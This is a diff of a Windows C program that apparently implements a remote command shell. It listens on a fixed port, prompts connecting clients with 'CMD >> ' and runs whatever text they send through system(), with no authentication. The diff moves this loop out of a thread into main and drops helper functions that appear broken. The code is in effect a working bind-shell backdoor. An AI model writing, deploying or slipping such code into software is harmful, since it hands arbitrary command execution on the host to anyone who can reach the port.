@@ -44,91 +44,6 @@ size_t s;
 
 #define MAXBUF 1024
 
-void
-writesocket(socket)
-int *socket;
-{
-	DWORD dwRead, dwWritten;
-	char buf[BUFSIZ];
-	BOOL bSuccess = FALSE;
-	HANDLE hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-	HANDLE hStdError = GetStdHandle(STD_ERROR_HANDLE);
-
-    for(;;) {
-    	bSuccess = ReadFile(hStdOutput, buf, BUFSIZ, &dwRead, NULL);
-    	if(!bSuccess || dwRead == 0) break;
-
-    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
-    	if(!bSuccess) break;
-
-    	bSuccess = ReadFile(hStdError, buf, BUFSIZ, &dwRead, NULL);
-    	if(!bSuccess || dwRead == 0) break;
-
-    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
-    	if(!bSuccess) break;
-    }
-}
-
-void
-readsocket(socket)
-int *socket;
-{
-	DWORD dwRead, dwWritten;
-	char buf[BUFSIZ];
-	BOOL bSuccess = FALSE;
-	HANDLE hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
-	HANDLE hStdError = GetStdHandle(STD_ERROR_HANDLE);
-
-    for(;;) {
-    	bSuccess = ReadFile(hStdOutput, buf, BUFSIZ, &dwRead, NULL);
-    	if(!bSuccess || dwRead == 0) break;
-
-    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
-    	if(!bSuccess) break;
-
-    	bSuccess = ReadFile(hStdError, buf, BUFSIZ, &dwRead, NULL);
-    	if(!bSuccess || dwRead == 0) break;
-
-    	bSuccess = WriteFile(socket, buf, dwRead, &dwWritten, NULL);
-    	if(!bSuccess) break;
-    }
-}
-
-struct _tagCLIENT {
-	struct sockaddr_in client;
-	int clientfd;
-} clients;
-
-DWORD
-std_thread(lpVoid)
-LPVOID lpVoid;
-{
-	char message[256];
-	char buf[MAXBUF];
-	int bytes;
-	pzero(message, sizeof(message));
-	sprintf(message, "%s:%u client connected.", inet_ntoa(clients.client.sin_addr),
-		clients.client.sin_port);
-	puts(message);
-
-	do {
-		if(send(clients.clientfd, "CMD >> ", 8, 0) < 0)
-			puts("Error: sending data.");
-		bytes=recv(clients.clientfd, buf, MAXBUF, 0);
-		if(strncmp(buf, "", 1) != 0) system(buf);
-		else send(clients.clientfd, "Error: no command entered.", strlen("Error: no command entered."), 0);
-	} while(bytes > 0);
-
-	if(closesocket(clients.clientfd)==0) {
-		pzero(message, sizeof(message));
-		sprintf(message, "%s:%u client disconnected.", inet_ntoa(clients.client.sin_addr),
-			clients.client.sin_port);
-		puts(message);
-	}
-
-	return S_OK;
-}
-
 int
 main(argc, argv)
 int argc;
@@ -142,11 +57,9 @@ char **argv;
 	WSAStartup(MAKEWORD(2, 0), &wsaData);
 
 	if(argc < 2) {
-		HANDLE hThread = NULL;
 	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
 
 		/* Setup socket address struct */
-		pzero(&clients, sizeof(clients));
 		pzero(&self, sizeof(self));
 		self.sin_family = AF_INET;
 		self.sin_port = htons(MY_PORT);
@@ -161,17 +74,33 @@ char **argv;
 			int clientfd;
 			struct sockaddr_in client;
 			int clientlen = sizeof(client);
+			char message[256];
+			char buf[MAXBUF];
 
 			/* accept connection */
 			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
 			if(clientfd>0) {
-				clients.client = client;
-				clients.clientfd = clientfd;
-				hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&std_thread, NULL, 0, NULL);
+				int bytes;
+				pzero(message, sizeof(message));
+				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
+					client.sin_port);
+				puts(message);
+				do {
+					if(send(clientfd, "CMD >> ", 8, 0) < 0)
+						puts("Error: sending data.");
+					bytes=recv(clientfd, buf, MAXBUF, 0);
+					if(strncmp(buf, "", 1)!=0) { dup(1); dup(2); system(buf); }
+					else send(clientfd, "Error: no command entered.", strlen("Error: no command entered."), 0);
+				} while(bytes > 0);
+				if(closesocket(clientfd)==0) {
+					pzero(message, sizeof(message));
+					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
+						client.sin_port);
+					puts(message);
+				}
 			}
 		}
 
-		while(WaitForSingleObject(hThread, 0) != 0);
 		closesocket(sockfd);
 	} else if(argc == 2) {
 		char buf[MAXBUF];
@@ -188,7 +117,6 @@ char **argv;
         	pzero(buf, sizeof(buf)/sizeof(char));
         	pzero(reply, sizeof(reply)/sizeof(char));
 
-        	readsocket(&sockfd);
         	fflush(stdin);
         	if((recv(sockfd, reply, MAXBUF, 0)) < 0)
         		puts("Could not recv data.");
